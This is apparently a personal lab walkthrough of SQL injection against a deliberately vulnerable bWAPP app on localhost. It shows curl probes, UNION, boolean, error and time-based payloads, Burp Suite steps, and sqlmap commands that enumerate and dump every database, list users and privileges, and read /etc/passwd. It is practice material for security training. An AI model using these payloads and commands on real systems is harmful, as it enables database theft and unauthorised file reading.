SQL Injection (SQLi)



## What is SQL Injection?





# SQL Injection Methodology:

- In this we test target with this: http://localhost:1010/portal.php
<img width="1859" height="842" alt="image" src="https://github.com/user-attachments/assets/e3c6736d-f104-4c46-9d46-effae49967cb" />

- In target:
<img width="1828" height="972" alt="image" src="https://github.com/user-attachments/assets/3efd5986-3d10-40f5-b1f7-ae29d41ba337" />

<img width="1757" height="801" alt="image" src="https://github.com/user-attachments/assets/d0d05223-c098-470d-9a51-ac4ba3c667c4" />

<img width="1799" height="593" alt="image" src="https://github.com/user-attachments/assets/64edc6f1-8973-486c-8940-bb6ad100c9a3" />

- Now we see this.


## Basic SQL Injection 

### Simple Error-Based Testing
#### Test with single quote
````
curl "http://localhost:1010/portal.php?id=1'"
````
<img width="622" height="143" alt="image" src="https://github.com/user-attachments/assets/e389f0eb-a569-4daa-83c4-e5e4ebde4fe6" />

- So in this it not work with our target.

#### Test with double quote
````
curl "http://localhost:1010/portal.php?id=1\""
````
<img width="633" height="127" alt="image" src="https://github.com/user-attachments/assets/8de148f4-06e3-4200-bd2f-4c59bd0b1dbb" />


#### Test with parentheses
````
curl "http://localhost:1010/portal.php?id=1)"
````
<img width="664" height="147" alt="image" src="https://github.com/user-attachments/assets/59e7c96f-1a45-4bc7-a202-6b6c8ef353e3" />


### Boolean-Based Tests

#### Always true condition
````
curl "http://localhost:1010/portal.php?id=1 OR 1=1"
````
<img width="739" height="133" alt="image" src="https://github.com/user-attachments/assets/05a771df-12f5-4f54-b80a-88f05dbe5691" />


#### Always false condition
````
curl "http://localhost:1010/portal.php?id=1 AND 1=2"
````
<img width="738" height="132" alt="image" src="https://github.com/user-attachments/assets/b11be406-06dd-45a4-bc5f-1fa597ca45ec" />

---




## Using Burp Suite:

### SQLi via Post / Search
- In this if i input `iron man`:
<img width="1771" height="637" alt="image" src="https://github.com/user-attachments/assets/6393d74a-ccd9-45ce-9fcd-675bb706e794" />


- In this first i used it with my `Burp Suite` -> Open `Burp`:
<img width="1918" height="987" alt="image" src="https://github.com/user-attachments/assets/3439b582-847c-4be6-8ab5-38baf256343c" />

- After past target to our `Burp` browser:
<img width="1008" height="999" alt="image" src="https://github.com/user-attachments/assets/d2b1cf79-1e5b-4357-b8f6-52b7e08929f8" />

- But it requests to login again:
<img width="1008" height="905" alt="image" src="https://github.com/user-attachments/assets/629c6a86-3e1a-4ac8-a479-065095486d23" />

<img width="997" height="748" alt="image" src="https://github.com/user-attachments/assets/c249a51b-4b47-4d58-b51b-3e35f2c3d0cd" />


- After go back to our `Burp`:
<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/ca5d67f9-2ea0-439d-b61b-6f0e0c760894" />

- After open `Intecept on`:
<img width="1920" height="941" alt="image" src="https://github.com/user-attachments/assets/9217b428-9f22-462f-96a4-ca16f4462054" />


<img width="1918" height="597" alt="image" src="https://github.com/user-attachments/assets/44759e39-4b6b-4be6-8962-dd1f9688da6f" />

- After it will show this:
<img width="1918" height="820" alt="image" src="https://github.com/user-attachments/assets/8c7b2af2-8f96-4c25-a0c6-aeb5eed849f3" />

- After `Right` click -> click on `Send to repeater` or we can Press `Ctrl + R`:
<img width="1918" height="807" alt="image" src="https://github.com/user-attachments/assets/32e9a885-ba49-4bcc-aa79-32b21f14c156" />

- After click on `Reapeater`:
<img width="1918" height="1017" alt="image" src="https://github.com/user-attachments/assets/5d83daf7-d07c-4fa0-b982-b4e4d17ef60d" />

<img width="1918" height="925" alt="image" src="https://github.com/user-attachments/assets/8c27a842-f70e-45d5-bdce-06d0a84b1600" />

<img width="1918" height="851" alt="image" src="https://github.com/user-attachments/assets/b2ba9f79-4790-4698-8cf6-facb892d959a" />

- Now we see this, all of this we can change.

- If i chang e value it to this `1'`:
<img width="1918" height="856" alt="image" src="https://github.com/user-attachments/assets/cd92c23c-f0b6-416d-b84b-4497cb73fa3d" />

<img width="1918" height="852" alt="image" src="https://github.com/user-attachments/assets/b0f02591-abca-4e2a-a1b8-d0c356e4e560" />

<img width="1919" height="864" alt="image" src="https://github.com/user-attachments/assets/c4b402c5-8c07-4333-b3ce-cd478a0e57a4" />

- But in this not work good, after `Right` click on it and click on `Send to intruder` or Press `Ctrl + I`:
<img width="1918" height="901" alt="image" src="https://github.com/user-attachments/assets/062c599e-aac8-4034-b066-1e4cdac458ef" />

- Go back to intruder we will see this:
<img width="1917" height="951" alt="image" src="https://github.com/user-attachments/assets/e6df7f9a-79fc-4bb1-adb6-05181df827ea" />

<img width="1216" height="858" alt="image" src="https://github.com/user-attachments/assets/0f2c5f69-8fb2-4c2f-b87a-18195cf6e211" />

<img width="1918" height="922" alt="image" src="https://github.com/user-attachments/assets/47096eac-d54e-40d4-8214-4b8409381f81" />


- After go back to our `Repeater`, change from this:
<img width="1918" height="890" alt="image" src="https://github.com/user-attachments/assets/8f0c3247-69fa-4b9d-a30e-ec774e08e17d" />

- And Past this:
````
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null FROM information_schema.tables;--
````
<img width="1918" height="932" alt="image" src="https://github.com/user-attachments/assets/21dc1718-004c-4707-b60b-84dc22b2a338" />

- After change it make the same:
<img width="1917" height="862" alt="image" src="https://github.com/user-attachments/assets/ea3895ff-1065-4c2c-b7c5-c4fef8653503" />

<img width="1918" height="972" alt="image" src="https://github.com/user-attachments/assets/eee66f37-7f70-493a-ad8b-726da801e446" />

- Now we got successful.

- Or we can use direct in `ÃŒntercept`, just copy our `payload`:
````
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null FROM information_schema.tables;--
````
<img width="1918" height="704" alt="image" src="https://github.com/user-attachments/assets/9bb6c1a8-0ffd-4222-8599-036f7f0dfdb6" />

- Change from this to this:
<img width="1918" height="742" alt="image" src="https://github.com/user-attachments/assets/98002e50-e8be-4b1a-bc40-15b9a3e4e3d8" />

<img width="1001" height="933" alt="image" src="https://github.com/user-attachments/assets/433a632f-7f25-4256-b691-900a45807a09" />

- Now we got successful.



## Use SQLMap:
- In this i use `SQLMap` in my windows, so i need to install it:
````
sudo apt install sqlmap -y
````
<img width="1144" height="849" alt="image" src="https://github.com/user-attachments/assets/725a973a-c3f7-4b83-95dc-b6663bc7d559" />

### In this i need to find `Parameters`:
- In this i try to input Injection and i find if i input letter `h`:
<img width="1756" height="759" alt="image" src="https://github.com/user-attachments/assets/e6066adf-4b58-4c58-9c27-1fdebb29bcbf" />


- So we can use `SQLMap`.


### Test tittle parameter:
- In this i want to test with this command:
````
sqlmap -u "http://localhost:1010/sqli_6.php" --data="title=ironman&action=search" -p title --batch
````
<img width="1902" height="987" alt="image" src="https://github.com/user-attachments/assets/e5914e97-8d59-43b1-bbbf-8dce1a106efe" />

- Not in this it failed.

- I test with session cookie.


### Test with session cookie:
To find session cookie:
- Go to our target -> `Righ click` on it -> select `Inspect` or we can press `F12`:
<img width="1793" height="796" alt="image" src="https://github.com/user-attachments/assets/2dd6235d-f07a-4e76-8d25-b22d3459b3dd" />

````
document.cookie
````
<img width="1858" height="567" alt="image" src="https://github.com/user-attachments/assets/64fea34f-cdfb-4ecc-a335-18e98e7e2dfc" />

- Now we found the session cookie: `c3v70ge1asjv77g94ts0e3b5c1`

````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch
````
<img width="1903" height="895" alt="image" src="https://github.com/user-attachments/assets/c4386c69-c816-43d8-8642-3140475faa25" />

<img width="1907" height="568" alt="image" src="https://github.com/user-attachments/assets/df89aef9-a73c-4902-a48c-432c2400c2e3" />

- Now we found `Payload`.

- If i test to upload:
In this i use it in burp:
<img width="1396" height="376" alt="image" src="https://github.com/user-attachments/assets/ba94c6f4-ad44-4752-a44e-28149bb17117" />

<img width="1227" height="627" alt="image" src="https://github.com/user-attachments/assets/0e36c52c-dd07-44bb-979b-d8f663d44b30" />

- After back to our `Burp`:
<img width="1919" height="897" alt="image" src="https://github.com/user-attachments/assets/98541c70-afbc-47e0-be68-c683c192d08e" />

- Press `Ctrl + R`:
<img width="1918" height="830" alt="image" src="https://github.com/user-attachments/assets/0bbbcaaf-9b6f-4b30-8701-688a39ecc042" />

<img width="1918" height="913" alt="image" src="https://github.com/user-attachments/assets/b644f75e-77b8-4f98-b627-eb5924725bf4" />

<img width="748" height="610" alt="image" src="https://github.com/user-attachments/assets/5dc0318d-89b6-42d3-aa49-973361ef97f1" />

- Change `h` to `h%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170717a71,0x49584c587246737750485368644453534479495064665272666441474a684451727247614758735a,0x716b7a6271),NULL#` 

<img width="1918" height="885" alt="image" src="https://github.com/user-attachments/assets/76dc7bcb-640a-4817-92e1-c01a0ea57c1d" />

<img width="1919" height="954" alt="image" src="https://github.com/user-attachments/assets/8c69e480-1cca-4956-9f43-939233323f6f" />

- Now we got successful.

- Payload that we can use:
````
h%' AND 3356=3356
h%' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170717a71,(SELECT (ELT(6815=6815,1))),0x716b7a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'ryik%'='ryik
h%' AND (SELECT 2686 FROM (SELECT(SLEEP(5)))Uauh) AND 'tqsC%'='tqsC
h%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170717a71,0x49584c587246737750485368644453534479495064665272666441474a684451727247614758735a,0x716b7a6271),NULL#
````
---


### Check if Injection was Found
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --flush-session -v 3
````
<img width="1914" height="1014" alt="image" src="https://github.com/user-attachments/assets/f43e327e-dedd-4d90-90cf-e91505124883" />

<img width="1911" height="935" alt="image" src="https://github.com/user-attachments/assets/cdd39643-c52d-4c1d-b581-4e325e7c44d2" />

<img width="1884" height="994" alt="image" src="https://github.com/user-attachments/assets/d6739dcd-013e-4be4-ab3f-126eaac4d45c" />

<img width="1897" height="766" alt="image" src="https://github.com/user-attachments/assets/c5f3f026-4b1d-4afa-bda2-803e6f866582" />

<img width="1897" height="961" alt="image" src="https://github.com/user-attachments/assets/5246874f-c0b5-4711-9af7-6eac6c867265" />


### Get Database Information
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --current-db
````
<img width="1913" height="918" alt="image" src="https://github.com/user-attachments/assets/4265c0f5-19ab-4336-80a9-5f9e5d3c05d7" />

- Now we see current database name `bWAPP`.



### List All Databases
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --dbs
````
<img width="1915" height="1012" alt="image" src="https://github.com/user-attachments/assets/a52cf629-9e9b-4882-9b99-41229fa4c5eb" />


## Get Database Tables
### Current database
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --tables
````
<img width="1914" height="803" alt="image" src="https://github.com/user-attachments/assets/e7ce277d-a922-4187-8287-18b8e0a2a774" />

<img width="1115" height="883" alt="image" src="https://github.com/user-attachments/assets/ee5cf054-994a-44a2-8b5c-b3cc4aa4b672" />

<img width="927" height="976" alt="image" src="https://github.com/user-attachments/assets/4acb4578-dc04-4a0e-ac7e-04970e1f54b0" />


### Specific Database
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch -D bWAPP --tables
````
<img width="1904" height="947" alt="image" src="https://github.com/user-attachments/assets/fc9f7e1b-8183-4411-9e2e-f0ffcef86d43" />



## Extract Data from Tables
### Get Table Columns
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch -D bWAPP -T blog --columns
````
<img width="1916" height="707" alt="image" src="https://github.com/user-attachments/assets/4d50e2f1-360f-4559-ba53-fecaff293ca4" />

<img width="1901" height="985" alt="image" src="https://github.com/user-attachments/assets/f6ea130a-261c-4cf9-bbaf-3d9b2ca535cf" />




### Dump Table Contents

- Dump specific table
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch -D bWAPP -T blog --dump
````
<img width="1886" height="900" alt="image" src="https://github.com/user-attachments/assets/039e7b95-d28f-4797-8899-f69d54d7f4eb" />


- Dump all tables from database
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch -D bWAPP --dump-all
````
<img width="1914" height="842" alt="image" src="https://github.com/user-attachments/assets/c602a0ae-b6f1-4912-a8c7-623fae797017" />

<img width="1477" height="661" alt="image" src="https://github.com/user-attachments/assets/3fa040c9-0689-47d9-868c-b44bb860ad8f" />

<img width="1110" height="607" alt="image" src="https://github.com/user-attachments/assets/03002b8c-3f6e-4846-b027-532b9f05b386" />

---



## Advanced Enumeration


### Get Database Users and Privileges

#### Get current user
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --current-user
````
<img width="1901" height="906" alt="image" src="https://github.com/user-attachments/assets/9953507d-a511-4071-85c1-a12d444663d8" />


#### Get all users
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --users
````
<img width="1908" height="995" alt="image" src="https://github.com/user-attachments/assets/7a9c802b-834e-4c2d-a703-58d3bb009d07" />


#### Get privileges
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1"  --data="title=h&action=search" -p title --batch --privileges
````
<img width="1914" height="804" alt="image" src="https://github.com/user-attachments/assets/d62c6513-8db6-45ea-8030-c8a30fa2e2a5" />

<img width="1200" height="904" alt="image" src="https://github.com/user-attachments/assets/ece81b91-f459-43d9-8c4f-7503a9c3e842" />

<img width="894" height="941" alt="image" src="https://github.com/user-attachments/assets/3b0f618f-4401-491e-a248-cb1ad1648f1f" />

---



## Comprehensive Attack
### Full Database Dump
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --dump-all --exclude-sysdbs
````
<img width="1905" height="908" alt="image" src="https://github.com/user-attachments/assets/2b1e1ce0-b48a-4316-b928-373ef2470bef" />


<img width="1241" height="1021" alt="image" src="https://github.com/user-attachments/assets/1f955c0f-9760-45c4-8094-a6d15fbdc391" />


### OS and File System Access (If privileges allow)
#### Check if file read is possible
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --file-read="/etc/passwd"
````
<img width="1895" height="733" alt="image" src="https://github.com/user-attachments/assets/67c89ad5-d9a9-4824-84e6-adf87c8ca900" />



## ptimized Single Command
````
sqlmap -u "http://localhost:1010/sqli_6.php" \
  --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" \
  --data="title=h&action=search" \
  -p title \
  --batch \
  --level=5 \
  --risk=3 \
  --dbs \
  --tables \
  --current-db \
  --current-user
````
<img width="1894" height="913" alt="image" src="https://github.com/user-attachments/assets/33cc1d30-c4ae-4f7c-984e-b32fe6e85514" />

<img width="1200" height="838" alt="image" src="https://github.com/user-attachments/assets/99de1792-1a8d-4a9a-bcf6-a71ff4b5d0fe" />

<img width="1200" height="824" alt="image" src="https://github.com/user-attachments/assets/30256d9e-4368-41cf-a89c-ae9e27ec459c" />


---






























